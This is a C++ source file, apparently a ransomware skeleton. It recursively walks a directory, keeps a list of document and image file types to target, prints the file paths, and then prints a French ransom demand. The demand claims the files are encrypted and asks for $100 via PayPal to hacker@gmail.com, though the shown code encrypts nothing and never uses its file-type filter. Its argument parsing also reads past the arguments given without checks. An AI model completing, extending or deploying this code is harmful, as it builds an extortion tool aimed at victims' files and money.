#include <string>
#include <vector>
#include <iostream>
#include <algorithm>
#include <experimental/filesystem>

using namespace std;
namespace filesys = experimental::filesystem;

// Global variables
string DIRECTORY;
vector<string> FILE_TYPES;
vector<string> AVAILABLE_FILE_TYPES = {
    "jpg",
    "png",
    "doc",
    "pdf",
    "txt"};

/*
 * Get the list of all files in given directory and its sub directories.
 *
 * Arguments
 * 	dirPath : Path of directory to be traversed
 *
 * Returns:
 * 	vector containing paths of all the files in given directory and its sub directories
 *
 * Reference: https://thispointer.com/c-get-the-list-of-all-files-in-a-given-directory-and-its-sub-directories-using-boost-c17/
 */
vector<string> getAllFilesInDir(const string &dirPath)
{

    // Create a vector of string
    vector<string> listOfFiles;
    try
    {
        // Check if given path exists and points to a directory
        if (filesys::exists(dirPath) && filesys::is_directory(dirPath))
        {
            // Create a Recursive Directory Iterator object and points to the starting of directory
            filesys::recursive_directory_iterator iter(dirPath);

            // Create a Recursive Directory Iterator object pointing to end.
            filesys::recursive_directory_iterator end;

            // Iterate till end
            while (iter != end)
            {
                // Add the name in vector
                listOfFiles.push_back(iter->path().string());

                error_code ec;
                // Increment the iterator to point to next entry in recursive iteration
                iter.increment(ec);
                if (ec)
                {
                    cerr << "Error While Accessing : " << iter->path().string() << " :: " << ec.message() << '\n';
                }
            }
        }
    }
    catch (system_error &e)
    {
        cerr << "Exception :: " << e.what();
    }
    return listOfFiles;
}

int main(int argc, char *argv[])
{
    // ------------  Parse arguments
    // NB: no arg checks because user is trustful
    for (int i = 1; i < argc; ++i)
    {
        string arg = argv[i];
        if (arg == "-d")
        {
            DIRECTORY = argv[i + 1];
            i++;
        }
        else if (arg == "-f")
        {
            FILE_TYPES.push_back(argv[i + 1]);
            i++;
        }
    }

    vector<string> filesList = getAllFilesInDir(DIRECTORY);

    for (const auto &i : filesList)
        std::cout << i << endl;

    cout
        << "Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,"
        << "une rançon de 100$ doit être payée sur le compte PayPal hacker@gmail.com "
        << "pour pouvoir récupérer vos données" << endl;

    return 0;
}
